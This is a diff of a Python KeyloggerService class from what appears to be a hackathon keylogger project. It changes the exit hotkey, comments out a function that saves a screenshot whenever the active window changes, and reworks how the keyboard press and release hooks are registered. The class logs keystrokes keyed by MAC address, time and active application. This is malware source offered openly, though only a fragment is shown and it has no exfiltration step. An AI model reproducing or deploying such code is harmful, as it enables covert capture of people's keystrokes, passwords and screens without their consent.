@@ -15,10 +15,11 @@ class KeyloggerService:
     def __change_action(self):
         self.__action = not (self.__action)
 
-
+    def return_action(self):
+        return self.__action
     def __exit_point(self):
-        if keyboard.is_pressed('q'):
-            os._exit(0)
+        if keyboard.is_pressed('shift+q'):
+            # os._exit(0)
             self.__change_action()
 
     @staticmethod
@@ -36,12 +37,12 @@ class KeyloggerService:
         return pressed_key.name
 
 
-    def current_screenshot(self):
-        if [self.prev_up] != [self.current_app]:
-            screen_shot = ImageGrab.grab()
-            path = rF"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output\newfile-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
-            screen_shot.save(path)
-            self.prev_up = self.current_app
+    # def current_screenshot(self):
+    #     if [self.prev_up] != [self.current_app]:
+    #         screen_shot = ImageGrab.grab()
+    #         path = rf"C:\Users\1\projet keylogger kodkode\picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+    #         screen_shot.save(path)
+    #         self.prev_up = self.current_app
 
     def __add_to_data(self, dictionary: dict, data: str):
         current_time = self.__current_time()
@@ -58,16 +59,11 @@ class KeyloggerService:
             dictionary[current_mac_address][current_time][self.current_app] = []
         dictionary[current_mac_address][current_time][self.current_app].append(data)
 
-
-    def  return_action(self):
-        return self.__action
-
     def start(self):
         self.__change_action()
-        while self.__action:
-            keyboard.on_press(self.__on_press)
-            keyboard.on_release(self.__add_on_release)
-            time.sleep(0.1)
+        keyboard.on_press(self.__on_press)
+        keyboard.on_release(self.__add_on_release)
+        time.sleep(0.1)
 
 
     def get_data(self):
@@ -75,8 +71,8 @@ class KeyloggerService:
         self.__data = {}
         return data
 
-    def __enter__(self):
-        self.start()
+    # def __enter__(self):
+    #     self.start()
 
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        return 1
+    # def __exit__(self, exc_type, exc_val, exc_tb):
+    #     return 1
